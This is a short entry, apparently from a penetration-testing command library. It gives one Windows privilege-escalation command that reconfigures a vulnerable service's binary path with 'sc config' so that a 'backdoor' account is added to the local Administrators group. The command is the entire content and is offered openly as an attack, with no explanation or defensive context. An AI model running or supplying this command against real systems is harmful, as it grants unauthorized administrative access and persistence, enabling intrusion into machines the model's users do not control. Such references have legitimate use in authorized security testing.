---
id: 49c20318-8be6-42d5-a182-3d3d1c1301aa
name: SC Config - Add Backdoor User to Administrators Group
type: command
executor: bash
data: $ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
output: null
created_at: '2023-04-06T03:56:29.545187+00:00'
updated_at: '2023-04-10T20:37:52.272360+00:00'
---

# SC Config - Add Backdoor User to Administrators Group

```bash
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
```
